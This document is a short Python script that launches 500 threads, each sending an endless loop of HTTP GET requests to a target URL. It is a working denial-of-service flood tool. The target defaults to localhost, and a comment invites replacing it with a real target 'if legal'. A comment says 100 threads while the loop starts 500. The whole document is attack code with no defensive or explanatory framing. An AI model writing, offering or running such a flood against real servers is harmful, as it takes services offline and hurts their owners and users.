import threading
import requests

# Target IP (use a local test server like Flask or Apache)
target_url = "http://127.0.0.1:8000"
  # Replace with the actual target if legal

def attack():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Sent request, response: {response.status_code}")
        except requests.exceptions.RequestException:
            print("Server Down!")

# Launch multiple threads to send requests
for _ in range(500):  # 100 threads sending requests
    thread = threading.Thread(target=attack)
    thread.start()
